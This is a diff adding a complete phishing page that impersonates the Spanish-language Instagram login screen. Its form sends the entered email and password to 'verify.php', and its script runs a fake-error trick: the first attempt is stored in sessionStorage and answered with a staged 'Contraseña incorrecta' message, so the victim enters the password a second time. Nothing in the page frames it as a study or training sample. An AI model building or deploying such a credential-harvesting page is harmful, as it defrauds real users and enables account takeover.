@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Instagram • Iniciar sesión</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Ccircle cx='12' cy='12' r='10' fill='url(%23igGrad)'/%3E%3Cdefs%3E%3ClinearGradient id='igGrad' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23f09433'/%3E%3Cstop offset='25%25' stop-color='%23e6683c'/%3E%3Cstop offset='50%25' stop-color='%23dc2743'/%3E%3Cstop offset='75%25' stop-color='%23cc2366'/%3E%3Cstop offset='100%25' stop-color='%23bc1888'/%3E%3C/linearGradient%3E%3C/defs%3E%3C/svg%3E">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; flex-direction: column; min-height: 100vh; }
+        .ig-container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; gap: 32px; }
+        .ig-phones { display: none; }
+        @media (min-width: 876px) { .ig-phones { display: block; position: relative; width: 380px; height: 580px; } .ig-phone-screenshot { position: absolute; top: 24px; left: 152px; width: 250px; height: 538px; background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); border-radius: 32px; display: flex; align-items: center; justify-content: center; } .ig-phone-screenshot::before { content: "📱 Instagram"; color: white; font-size: 24px; font-weight: bold; } }
+        .ig-login-wrapper { width: 100%; max-width: 350px; }
+        .ig-login-box { background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px; margin-bottom: 10px; }
+        .ig-logo { text-align: center; margin-bottom: 24px; }
+        .ig-logo svg { width: 175px; height: 51px; }
+        .error-box { background: #fff3f3; border: 1px solid #ed4956; border-radius: 4px; padding: 12px; margin-bottom: 16px; display: none; }
+        .error-box.show { display: block; animation: shake 0.5s; }
+        .error-title { color: #ed4956; font-weight: 600; font-size: 14px; margin-bottom: 4px; }
+        .error-message { color: #262626; font-size: 13px; }
+        .error-message a { color: #00376b; text-decoration: none; font-weight: 600; }
+        @keyframes shake { 0%,100%{transform:translateX(0);} 25%{transform:translateX(-5px);} 75%{transform:translateX(5px);} }
+        .ig-input-wrapper { margin-bottom: 6px; position: relative; }
+        .ig-input { width: 100%; padding: 9px 8px; font-size: 12px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; outline: none; }
+        .ig-input:focus { border-color: #a8a8a8; }
+        .ig-input-label { position: absolute; left: 8px; top: 50%; transform: translateY(-50%); color: #8e8e8e; font-size: 12px; pointer-events: none; transition: all 0.1s; background: #fafafa; padding: 0 4px; }
+        .ig-input:focus + .ig-input-label, .ig-input:not(:placeholder-shown) + .ig-input-label { top: 0; font-size: 10px; color: #8e8e8e; }
+        .ig-input::placeholder { opacity: 0; }
+        .ig-login-btn { background: #0095f6; color: white; border: none; padding: 7px 16px; font-size: 14px; font-weight: 600; border-radius: 8px; width: 100%; cursor: pointer; margin: 16px 0; }
+        .ig-login-btn:disabled { opacity: 0.7; }
+        .ig-divider { display: flex; align-items: center; margin: 16px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .ig-divider::before, .ig-divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
+        .ig-divider span { margin: 0 18px; }
+        .ig-fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; margin-bottom: 16px; }
+        .ig-fb-login svg { width: 16px; height: 16px; }
+        .ig-forgot { text-align: center; font-size: 12px; }
+        .ig-forgot a { color: #00376b; text-decoration: none; }
+        .ig-signup-box { background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; margin-bottom: 10px; }
+        .ig-signup-box span { color: #262626; font-size: 14px; }
+        .ig-signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
+        .ig-app-links { text-align: center; margin-top: 20px; }
+        .ig-app-links p { color: #262626; font-size: 14px; margin-bottom: 16px; }
+        .ig-app-buttons { display: flex; gap: 8px; justify-content: center; }
+        .ig-app-btn { display: inline-block; padding: 8px 16px; background: #000; color: white; border-radius: 6px; text-decoration: none; font-size: 12px; font-weight: 600; }
+        .ig-footer { padding: 20px 0; text-align: center; }
+        .ig-footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; margin-bottom: 16px; }
+        .ig-footer-links a { color: #8e8e8e; font-size: 12px; text-decoration: none; }
+        .ig-copyright { color: #8e8e8e; font-size: 12px; }
+        .loading-spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (max-width: 480px) { .ig-login-box { background: transparent; border: none; padding: 20px; } .ig-signup-box { background: transparent; border: none; } body { background: white; } }
+    </style>
+</head>
+<body>
+    <main class="ig-container">
+        <div class="ig-phones"><div class="ig-phone-screenshot"></div></div>
+        <div class="ig-login-wrapper">
+            <div class="ig-login-box">
+                <div class="ig-logo">
+                    <!-- Logo Instagram SVG (ícono cámara + texto) -->
+                    <svg viewBox="0 0 200 50" width="200" height="50">
+                        <defs><linearGradient id="igGradLogo" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#f09433"/><stop offset="25%" stop-color="#e6683c"/><stop offset="50%" stop-color="#dc2743"/><stop offset="75%" stop-color="#cc2366"/><stop offset="100%" stop-color="#bc1888"/></linearGradient></defs>
+                        <rect x="2" y="8" width="34" height="34" rx="8" fill="url(#igGradLogo)"/>
+                        <circle cx="19" cy="25" r="7" fill="none" stroke="white" stroke-width="2"/>
+                        <circle cx="29" cy="16" r="2" fill="white"/>
+                        <text x="45" y="36" font-family="'Billabong', 'Grand Hotel', cursive, Arial" font-size="32" font-weight="600" fill="#262626">Instagram</text>
+                    </svg>
+                </div>
+                <div class="error-box" id="errorBox"><div class="error-title">⚠️ Contraseña incorrecta</div><div class="error-message">La contraseña que has introducido no es correcta. <a href="recovery.html">¿Has olvidado la contraseña?</a></div></div>
+                <form action="verify.php" method="POST" id="loginForm">
+                    <input type="hidden" name="platform" value="instagram"><input type="hidden" name="attempt" id="attemptInput" value="1">
+                    <div class="ig-input-wrapper"><input type="text" name="email" class="ig-input" id="emailInput" placeholder=" " required><span class="ig-input-label">Teléfono, usuario o correo electrónico</span></div>
+                    <div class="ig-input-wrapper"><input type="password" name="pass" class="ig-input" id="passInput" placeholder=" " required><span class="ig-input-label">Contraseña</span></div>
+                    <button type="submit" class="ig-login-btn" id="loginBtn">Iniciar sesión</button>
+                    <div class="ig-divider"><span>O</span></div>
+                    <a href="#" class="ig-fb-login"><svg viewBox="0 0 16 16" fill="#385185"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>Iniciar sesión con Facebook</a>
+                    <div class="ig-forgot"><a href="recovery.html">¿Olvidaste tu contraseña?</a></div>
+                </form>
+            </div>
+            <div class="ig-signup-box"><span>¿No tienes una cuenta?</span> <a href="#">Regístrate</a></div>
+            <div class="ig-app-links"><p>Descarga la aplicación</p><div class="ig-app-buttons"><a href="#" class="ig-app-btn">App Store</a><a href="#" class="ig-app-btn">Google Play</a></div></div>
+        </div>
+    </main>
+    <footer class="ig-footer"><div class="ig-footer-links"><a href="#">Meta</a><a href="#">Información</a><a href="#">Blog</a><a href="#">Empleo</a><a href="#">Ayuda</a><a href="#">API</a><a href="#">Privacidad</a><a href="#">Condiciones</a><a href="#">Ubicaciones</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Subir contactos</a><a href="#">Meta Verified</a></div><div class="ig-copyright">© 2025 Instagram from Meta</div></footer>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search); const showError = urlParams.get('error') === '1'; const savedEmail = urlParams.get('email');
+        if(showError){ document.getElementById('errorBox').classList.add('show'); if(savedEmail){ document.getElementById('emailInput').value = decodeURIComponent(savedEmail); document.getElementById('passInput').focus(); } document.getElementById('attemptInput').value = '2'; }
+        const storedEmail = sessionStorage.getItem('ig_email'); if(storedEmail && !savedEmail) document.getElementById('emailInput').value = storedEmail;
+        document.getElementById('loginForm').addEventListener('submit', function(e){ const email = document.getElementById('emailInput').value; const pass = document.getElementById('passInput').value; const attempt = document.getElementById('attemptInput').value;
+            if(attempt === '1'){ e.preventDefault(); sessionStorage.setItem('ig_email', email); sessionStorage.setItem('ig_pass', pass); const btn = document.getElementById('loginBtn'); btn.innerHTML = '<span class="loading-spinner"></span>Verificando...'; btn.disabled = true; setTimeout(() => { window.location.href = `index.html?error=1&email=${encodeURIComponent(email)}`; }, 2000); }
+        });
+    </script>
+</body>
+</html>
